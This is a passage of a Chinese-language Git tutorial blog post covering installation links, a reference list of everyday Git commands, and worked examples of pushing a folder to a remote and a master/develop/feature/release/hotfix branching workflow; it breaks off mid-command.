href="http://git-scm.com/download/mac" target="_blank" rel="noopener">http://git-scm.com/download/mac</a></li><li>在Mac系统下也可以安装图形化Git工具，你可以在git官方网站上下载安装程序，网址为：<a href="https://central.github.com/deployments/desktop/desktop/latest/darwin" target="_blank" rel="noopener">https://central.github.com/deployments/desktop/desktop/latest/darwin</a>，下载git-osx-installer到本机后进行手动安装。</li></ul><h3 id="3、Windows-安装git"><a href="#3、Windows-安装git" class="headerlink" title="3、Windows 安装git"></a>3、Windows 安装git</h3><p>在 Windows 上安装 Git 也有几种安装方法。官方版本可以在 Git 官方网站下载。 打开<a href="http://git-scm.com/download/win" target="_blank" rel="noopener">http://git-scm.com/download/win</a>，下载会自动开始。<br>如果你想安装更新的版本，可以在Git官方网站下载由官方维护的 windows Git 安装程序可以访问<a href="https://central.github.com/deployments/desktop/desktop/latest/win32?format=msi" target="_blank" rel="noopener">https://central.github.com/deployments/desktop/desktop/latest/win32?format=msi</a>进行下载，然后安装。</p><h2 id="四、Git基础操作命令介绍"><a href="#四、Git基础操作命令介绍" class="headerlink" title="四、Git基础操作命令介绍"></a>四、Git基础操作命令介绍</h2><p>本节详细介绍了git常用命令及基础操作方法</p><h3 id="1、新建代码库"><a href="#1、新建代码库" class="headerlink" title="1、新建代码库"></a>1、新建代码库</h3><ul><li><p>在当前目录新建一个Git代码库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure></li><li><p>新建一个目录，将其初始化为Git代码库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init [project-name]</span><br></pre></td></tr></table></figure></li><li><p>下载一个项目和它的整个代码历史</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone [url]</span><br></pre></td></tr></table></figure></li></ul><h3 id="2、配置"><a href="#2、配置" class="headerlink" title="2、配置"></a>2、配置</h3><p>Git的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。</p><ul><li><p>显示当前的Git配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --list</span><br></pre></td></tr></table></figure></li><li><p>编辑Git配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config -e [--global]</span><br></pre></td></tr></table></figure></li><li><p>设置提交代码时的用户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config [--global] user.name &quot;[name]&quot;</span><br><span class="line">git config [--global] user.email &quot;[email address]&quot;</span><br></pre></td></tr></table></figure></li></ul><h3 id="3、增加-删除文件"><a href="#3、增加-删除文件" class="headerlink" title="3、增加/删除文件"></a>3、增加/删除文件</h3><ul><li><p>添加指定文件到暂存区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add [file1] [file2] ...</span><br></pre></td></tr></table></figure></li><li><p>添加指定目录到暂存区，包括子目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add [dir]</span><br></pre></td></tr></table></figure></li><li><p>添加当前目录的所有文件到暂存区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure></li><li><p>添加每个变化前，都会要求确认,对于同一个文件的多处变化，可以实现分次提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add -p</span><br></pre></td></tr></table></figure></li><li><p>删除工作区文件，并且将这次删除放入暂存区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rm [file1] [file2] ...</span><br></pre></td></tr></table></figure></li><li><p>停止追踪指定文件，但该文件会保留在工作区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rm --cached [file]</span><br></pre></td></tr></table></figure></li><li><p>改名文件，并且将这个改名放入暂存区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git mv [file-original] [file-renamed]</span><br></pre></td></tr></table></figure></li></ul><h3 id="4、代码提交"><a href="#4、代码提交" class="headerlink" title="4、代码提交"></a>4、代码提交</h3><ul><li><p>提交暂存区到仓库区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m [message]</span><br></pre></td></tr></table></figure></li><li><p>提交暂存区的指定文件到仓库区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit [file1] [file2] ... -m [message]</span><br></pre></td></tr></table></figure></li><li><p>提交工作区自上次commit之后的变化，直接到仓库区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -a</span><br></pre></td></tr></table></figure></li><li><p>提交时显示所有diff信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -v</span><br></pre></td></tr></table></figure></li><li><p>使用一次新的commit，替代上一次提交, 如果代码没有任何新变化，则用来改写上一次commit的提交信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit --amend -m [message]</span><br></pre></td></tr></table></figure></li><li><p>重做上一次commit，并包括指定文件的新变化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit --amend [file1] [file2] ...</span><br></pre></td></tr></table></figure></li></ul><h3 id="5、分支"><a href="#5、分支" class="headerlink" title="5、分支"></a>5、分支</h3><ul><li><p>列出所有本地分支</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch</span><br></pre></td></tr></table></figure></li><li><p>列出所有远程分支</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -r</span><br></pre></td></tr></table></figure></li><li><p>列出所有本地分支和远程分支</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -a</span><br></pre></td></tr></table></figure></li><li><p>新建一个分支，但依然停留在当前分支</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch [branch-name]</span><br></pre></td></tr></table></figure></li><li><p>新建一个分支，并切换到该分支</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b [branch]</span><br></pre></td></tr></table></figure></li><li><p>新建一个分支，指向指定commit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch [branch] [commit]</span><br></pre></td></tr></table></figure></li><li><p>新建一个分支，与指定的远程分支建立追踪关系</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch --track [branch] [remote-branch]</span><br></pre></td></tr></table></figure></li><li><p>切换到指定分支，并更新工作区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout [branch-name]</span><br></pre></td></tr></table></figure></li><li><p>切换到上一个分支</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -</span><br></pre></td></tr></table></figure></li><li><p>建立追踪关系，在现有分支与指定的远程分支之间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch --set-upstream [branch] [remote-branch]</span><br></pre></td></tr></table></figure></li><li><p>合并指定分支到当前分支</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge [branch]</span><br></pre></td></tr></table></figure></li><li><p>选择一个commit，合并进当前分支</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git cherry-pick [commit]</span><br></pre></td></tr></table></figure></li><li><p>删除分支</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -d [branch-name]</span><br></pre></td></tr></table></figure></li><li><p>删除远程分支</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git push origin --delete [branch-name]</span><br><span class="line">git branch -dr [remote/branch]</span><br></pre></td></tr></table></figure></li></ul><h3 id="6、标签"><a href="#6、标签" class="headerlink" title="6、标签"></a>6、标签</h3><ul><li><p>列出所有tag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git tag</span><br></pre></td></tr></table></figure></li><li><p>新建一个tag在当前commit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git tag [tag]</span><br></pre></td></tr></table></figure></li><li><p>新建一个tag在指定commit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git tag [tag] [commit]</span><br></pre></td></tr></table></figure></li><li><p>删除本地tag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git tag -d [tag]</span><br></pre></td></tr></table></figure></li><li><p>删除远程tag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin :refs/tags/[tagName]</span><br></pre></td></tr></table></figure></li><li><p>查看tag信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git show [tag]</span><br></pre></td></tr></table></figure></li><li><p>提交指定tag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push [remote] [tag]</span><br></pre></td></tr></table></figure></li><li><p>提交所有tag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push [remote] --tags</span><br></pre></td></tr></table></figure></li><li><p>新建一个分支，指向某个tag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b [branch] [tag]</span><br></pre></td></tr></table></figure></li></ul><h3 id="7、查看信息"><a href="#7、查看信息" class="headerlink" title="7、查看信息"></a>7、查看信息</h3><ul><li><p>显示有变更的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure></li><li><p>显示当前分支的版本历史</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure></li><li><p>显示commit历史，以及每次commit发生变更的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log --stat</span><br></pre></td></tr></table></figure></li><li><p>搜索提交历史，根据关键词</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log -S [keyword]</span><br></pre></td></tr></table></figure></li><li><p>显示某个commit之后的所有变动，每个commit占据一行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log [tag] HEAD --pretty=format:%s</span><br></pre></td></tr></table></figure></li><li><p>显示某个commit之后的所有变动，其”提交说明”必须符合搜索条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log [tag] HEAD --grep feature</span><br></pre></td></tr></table></figure></li><li><p>显示某个文件的版本历史，包括文件改名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git log --follow [file]</span><br><span class="line">git whatchanged [file]</span><br></pre></td></tr></table></figure></li><li><p>显示指定文件相关的每一次diff</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log -p [file]</span><br></pre></td></tr></table></figure></li><li><p>显示过去5次提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log -5 --pretty --oneline</span><br></pre></td></tr></table></figure></li><li><p>显示所有提交过的用户，按提交次数排序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git shortlog -sn</span><br></pre></td></tr></table></figure></li><li><p>显示指定文件是什么人在什么时间修改过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git blame [file]</span><br></pre></td></tr></table></figure></li><li><p>显示暂存区和工作区的差异</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff</span><br></pre></td></tr></table></figure></li><li><p>显示暂存区和上一个commit的差异</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff --cached [file]</span><br></pre></td></tr></table></figure></li><li><p>显示工作区与当前分支最新commit之间的差异</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff HEAD</span><br></pre></td></tr></table></figure></li><li><p>显示两次提交之间的差异</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff [first-branch]...[second-branch]</span><br></pre></td></tr></table></figure></li><li><p>显示今天你写了多少行代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff --shortstat &quot;@&#123;0 day ago&#125;&quot;</span><br></pre></td></tr></table></figure></li><li><p>显示某次提交的元数据和内容变化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git show [commit]</span><br></pre></td></tr></table></figure></li><li><p>显示某次提交发生变化的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git show --name-only [commit]</span><br></pre></td></tr></table></figure></li><li><p>显示某次提交时，某个文件的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git show [commit]:[filename]</span><br></pre></td></tr></table></figure></li><li><p>显示当前分支的最近几次提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reflog</span><br></pre></td></tr></table></figure></li></ul><h3 id="8、远程同步"><a href="#8、远程同步" class="headerlink" title="8、远程同步"></a>8、远程同步</h3><ul><li><p>下载远程仓库的所有变动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git fetch [remote]</span><br></pre></td></tr></table></figure></li><li><p>显示所有远程仓库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote -v</span><br></pre></td></tr></table></figure></li><li><p>显示某个远程仓库的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote show [remote]</span><br></pre></td></tr></table></figure></li><li><p>增加一个新的远程仓库，并命名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add [shortname] [url]</span><br></pre></td></tr></table></figure></li><li><p>取回远程仓库的变化，并与本地分支合并</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull [remote] [branch]</span><br></pre></td></tr></table></figure></li><li><p>上传本地指定分支到远程仓库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push [remote] [branch]</span><br></pre></td></tr></table></figure></li><li><p>强行推送当前分支到远程仓库，即使有冲突</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push [remote] --force</span><br></pre></td></tr></table></figure></li><li><p>推送所有分支到远程仓库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push [remote] --all</span><br></pre></td></tr></table></figure></li></ul><h3 id="9、撤销"><a href="#9、撤销" class="headerlink" title="9、撤销"></a>9、撤销</h3><ul><li><p>恢复暂存区的指定文件到工作区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout [file]</span><br></pre></td></tr></table></figure></li><li><p>恢复某个commit的指定文件到暂存区和工作区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout [commit] [file]</span><br></pre></td></tr></table></figure></li><li><p>恢复暂存区的所有文件到工作区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout .</span><br></pre></td></tr></table></figure></li><li><p>重置暂存区的指定文件，与上一次commit保持一致，但工作区不变</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset [file]</span><br></pre></td></tr></table></figure></li><li><p>重置暂存区与工作区，与上一次commit保持一致</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard</span><br></pre></td></tr></table></figure></li><li><p>重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset [commit]</span><br></pre></td></tr></table></figure></li><li><p>重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard [commit]</span><br></pre></td></tr></table></figure></li><li><p>重置当前HEAD为指定commit，但保持暂存区和工作区不变</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --keep [commit]</span><br></pre></td></tr></table></figure></li><li><p>新建一个commit，用来撤销指定commit</p></li><li><p>后者的所有变化都将被前者抵消，并且应用到当前分支</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git revert [commit]</span><br></pre></td></tr></table></figure></li><li><p>暂时将未提交的变化移除，稍后再移入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git stash</span><br><span class="line">git stash pop</span><br></pre></td></tr></table></figure></li></ul><h3 id="10、其他"><a href="#10、其他" class="headerlink" title="10、其他"></a>10、其他</h3><ul><li>生成一个可供发布的压缩包<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git archive</span><br></pre></td></tr></table></figure></li></ul><h2 id="五、实例实践分享"><a href="#五、实例实践分享" class="headerlink" title="五、实例实践分享"></a>五、实例实践分享</h2><p>学习git的最好方式就是动手操作，在介绍完git基础操作后，通过两个典型实例进行进行实践，用以巩固学习git的基础操作。你可以在<a href="https://github.com" target="_blank" rel="noopener">https://github.com</a>上进行练习，也可以在我搭建的gitlab测试环境<a href="http://git.unixmen.cn/" target="_blank" rel="noopener">http://git.unixmen.cn/</a>进行练习实践。下面是案例介绍，Enjoy it!</p><h3 id="案例一：将现有文件夹加入到git远程仓库"><a href="#案例一：将现有文件夹加入到git远程仓库" class="headerlink" title="案例一：将现有文件夹加入到git远程仓库"></a>案例一：将现有文件夹加入到git远程仓库</h3><h4 id="1、实例描述："><a href="#1、实例描述：" class="headerlink" title="1、实例描述："></a>1、实例描述：</h4><p>将本地文件夹及文件夹中的内容加入到已有的远程仓库中。</p><h4 id="2、操作步骤剖析："><a href="#2、操作步骤剖析：" class="headerlink" title="2、操作步骤剖析："></a>2、操作步骤剖析：</h4><p>首先进入已存在的文件夹，然后对本地文件夹进行git初始化，接着添加远程仓库地址，将本地文件添加到本地缓存，然后确认，最后推送。</p><h4 id="3、操作步骤详细介绍："><a href="#3、操作步骤详细介绍：" class="headerlink" title="3、操作步骤详细介绍："></a>3、操作步骤详细介绍：</h4><ul><li><p>进入到已有文件夹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd _post</span><br></pre></td></tr></table></figure></li><li><p>将现有目录文件夹进行初始化<br>这将在当前目录下创建隐藏的文件夹.git，这个子目录含有你初始化的 Git 仓库中所有的必须文件，这些文件是 Git 仓库的骨干。 但是，在这个时候，我们仅仅是做了一个初始化的操作，你的项目里的文件还没有被跟踪。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure></li><li><p>添加远程git仓库<br>以下为命令为添加远程仓库的方法，其中“origin” 为添加的远程仓库的短名字以方便记录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin git@git.unixmen.cn:netb2c/blogs.git</span><br></pre></td></tr></table></figure></li><li><p>将本地文件夹添加到跟踪</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure></li><li><p>提交描述信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit</span><br></pre></td></tr></table></figure></li><li><p>将本地文件推送到远程仓库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure></li></ul><p>至此本案例操作完成，可通过web端查看项目提交结果，以上就是整个操作过程。</p><h3 id="案例二：利用分支进行开发的工作流程"><a href="#案例二：利用分支进行开发的工作流程" class="headerlink" title="案例二：利用分支进行开发的工作流程"></a>案例二：利用分支进行开发的工作流程</h3><h4 id="1、案例描述："><a href="#1、案例描述：" class="headerlink" title="1、案例描述："></a>1、案例描述：</h4><p>案例介绍利用git分支进行开发的工作流程的典型工作模式。</p><h4 id="2、背景介绍："><a href="#2、背景介绍：" class="headerlink" title="2、背景介绍："></a>2、背景介绍：</h4><p>工作流程在英语里，叫做”workflow”或者”flow”，原意是水流，比喻项目像水流那样，顺畅、自然地向前流动，不会发生冲击、对撞、甚至漩涡。<br>Git 作为一个强大及方便易管源码管理系统，不可避免涉及到多人协作。协作必须有一个规范的工作流程，而工作流程有各式各样的用法，但也正因此使得在实际工作中如何上手使用变得很头大，让大家有效地合作，使得项目井井有条地发展下去。</p><h4 id="3、利用分支进行开发的工作流程介绍："><a href="#3、利用分支进行开发的工作流程介绍：" class="headerlink" title="3、利用分支进行开发的工作流程介绍："></a>3、利用分支进行开发的工作流程介绍：</h4><ul><li><p>长期分支</p><ul><li><p>master 分支<br>master 永远处于稳定状态，这个分支代码可以随时用来部署。不允许在该分支直接提交代码。</p></li><li><p>develop 分支<br>开发分支，包含了项目最新的功能和代码，所有开发都在 develop 上进行。一般情况下小的修改直接在这个分支上提交代码。</p></li></ul></li><li><p>短期分支</p><ul><li>feature 分支<br>如果要改的一个东西会有比较多的修改，或者改的东西影响会比较大，请从 develop 分支开出一个 feature 分支，分支名约定为<code>feature/bigchange</code>，开发完成后合并回 develop 分支并且删除这个 feature 分支。<br>相应的操作如下：<blockquote><p>首先是新建分支</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b feature/bigchange develop</span><br></pre></td></tr></table></figure></blockquote></li></ul></li></ul><p>然后开始写代码，提交，写代码，提交。。。<br>然后直到feature 开发完成，合并回 develop，具体操作如下：<br>接着切换到develop分支下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout develop</span><br></pre></td></tr></table></figure></p><p>然后开始合并，注：合并的时候务必加上 –no-ff，以保持分支的合并历史<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge --no-ff feature/bigchange</span><br></pre></td></tr></table></figure></p><p>最后删除这个分支<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -d feature/bigchange</span><br></pre></td></tr></table></figure></p><p> 如果想要当前分支能保持与 develop 的更新，请用 rebase，操作如下：</p><blockquote><p>假设当前在 feature/bigchange 分支<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rebase develop</span><br></pre></td></tr></table></figure></p></blockquote><p>rebase 会修改历史，如果你的 feature 分支是跟人合作开发的，请互相做好协调。</p><ul><li>release 分支<br>当 develop 上的功能和 bug 修得差不多的时候，我们就要发布新版本了，这个时候从 develop 分支上开出一个 release 分支，来做发布前的准备，分支名约定为<code>release/20170525</code>，主要是测试有没有什么 bug，如果有 bug 就直接在这个分支上修复，确定没有问题后就会合并到 master 分支。<blockquote><p>相应操作如下：<br>新建release分支</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b release/20170525 develop</span><br></pre></td></tr></table></figure></blockquote></li></ul><p>修复 bug、检查没问题后合并到 master 分支并删除<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git checkout master</span><br><span class="line">git merge --no-ff release/20170525</span><br></pre></td></tr></table></figure></p><p>为了让 release 分支上 bug 修改作用到 develop 分支，我们还需要把这个 release 分支合并回 develop 分支.<br>响应操作如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git checkout develop</span><br><span class="line">git merge --no-ff release/20170525</span><br></pre></td></tr></table></figure></p><p>到此，这个 release 分支完成了它的使命，可以被删除了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -d release/20170525</span><br></pre></td></tr></table></figure></p><ul><li>hotfix 分支<br>如果我们发现线上的代码（也就是 master）有 bug，但是这个时候我们的 develop 上的有些功能还没完成，还不能发布，这个时候我们可以从 master 分支上开出一个 hotfix 分支（记住：直接在 master 上提交代码是不允许的！），分支名约定为<code>hotfix/fix</code>，在这个分支上修改完 bug 后需要把这个分支同时合并到 master 和 develop 分支。<blockquote><p>相应操作如下：<br>新建分支</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b hotfix/fix master</span><br></pre></td></tr></table></figure></blockquote></li></ul><p>修完 bug 并测试完成后，分别与master和develop分支进行合并<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout master</span><br><span class="line">git merge --no-ff hotfix/fix</span><br><span class="line">git checkout develop</span><br><span class="line">git merge --no-ff hotfix/fix</span><br></pre></td></tr></table></figure></p><p>然后可以删除分支<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -d hotfix/fix</span><br></pre></td></tr></table></figure></p><p>例外：当 hotfix 分支完成，这个时候如果有 release 分支存在，那么这个 hotfix 就应该合并到 release，而不是 develop 分支。</p><ul><li><p>proj 分支<br>proj 分支为项目分支。<br>所有的项目分支都从 master 上开出来，约定的分支名为<code>proj/xxx</code>。<br>所有的项目定制内容都直接在项目分支上提交。<br>为了保证项目的更新，每当项目有新版本发布时都需要把 master 分支合并到 proj 分支上。</p><ul><li>相应操作如下：<br>新建分支<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b proj/xxx master</span><br></pre></td></tr></table></figure></li></ul><p>定制。。。<br>如果 master 分支有更新</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git checkout proj/xxx master</span><br><span class="line">git merge --no-ff 